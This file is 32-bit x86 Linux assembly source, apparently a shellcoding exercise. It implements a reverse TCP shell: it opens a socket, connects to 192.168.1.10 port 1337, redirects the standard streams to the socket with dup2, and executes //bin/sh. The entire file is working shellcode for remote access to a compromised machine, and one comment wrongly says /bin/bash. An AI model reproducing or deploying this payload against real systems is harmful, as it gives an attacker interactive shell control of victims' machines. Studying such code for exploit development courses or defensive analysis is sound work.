global _start

section .text

_start:

    ;------------------
    ; int socket(2,1,0)
    ;------------------
    xor eax, eax 
    xor ebx, ebx 
    xor ecx, ecx
    xor edx, edx ; edx will contains 0 all the time 


    push edx
    push 1
    push 2
    
    mov al, 0x66 ;syscall for socketcall kernel entry point 
    mov bl, 1    ; socket
    mov ecx, esp ; ecx points to parameters of socket
    int 0x80     ; call socket
  
    ;------------------------------------
    ;int connect(sockfd, sockaddr_in * st, sizeof(st) 
    ;------------------------------------
    inc ebx  ; ebx contains 2 
    mov edi, eax ; eax contains sockfd
    ;lets build struct
    
    push 0x0a01a8c0   ; ip 192.168.1.10 
    push word 0x3905       ;port 1337
    push word bx           ; sin_family 
    mov ecx, esp      ; ecx points to sockaddr_in structure

    push 0x10 ; 16 len of struct is decimal 16
    push ecx  ; sockaddr_in struct
    push edi  ; sockfd 

    mov al , 0x66 
    inc bx ;bx contains 3 , syscall for connect
    mov ecx, esp ; ecx is a pointer to connect arguments   
    int 0x80 ; call connect 


    ;------
    ;DUP2   
    ;------
    mov ecx,ebx ; ebx contains 3, now ecx is the counter
    xchg ebx, edi ; ebx contains sockfd 

dup2:
    dec ecx  
    mov al , 0x3f   ;dup2 syscall 
    int 0x80
    jnz dup2

    ;-------
    ;execve("/bin/bash")
    ;---------
    push edx ; envp 
    push edx ; argv 
    push 0x68732F6E
    push 0x69622F2F ;//bin/sh, filename 
    mov ebx, esp  ; *filename 
    mov al, 0xb ; syscall for execve 
    int 0x80


    ;-------------------

